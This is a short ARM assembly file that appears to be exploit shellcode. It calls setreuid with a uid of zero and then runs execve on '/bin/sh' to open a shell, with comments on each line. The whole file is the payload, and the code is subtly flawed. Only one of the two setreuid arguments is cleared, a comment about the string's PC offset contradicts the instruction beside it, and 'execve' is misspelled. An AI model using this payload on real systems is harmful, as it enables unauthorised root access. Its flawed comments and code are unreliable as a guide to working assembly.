.section .text
.global _start

_start:
    @ setreuid(0,0)
    eor r1, r1                  @ clear out r1 to ask for uid of zero
    mov r7, #70                 @ #70 is the system call number for setreuid
    svc #0
    
    @ evecve("/bin/sh", argv, environment=null)
    eor r0, r0                  @ clear out r0
    add r0, pc, #12             @ shell command is at PC + 4 (PC-relative)
    mov r1, #0                  @ command line arguments (NULL)
    mov r2, #0                  @ Environment (NULL)
    mov r7, #11                 @ Execve syscall
    svc #0

.ascii "/bin/sh\0"
    
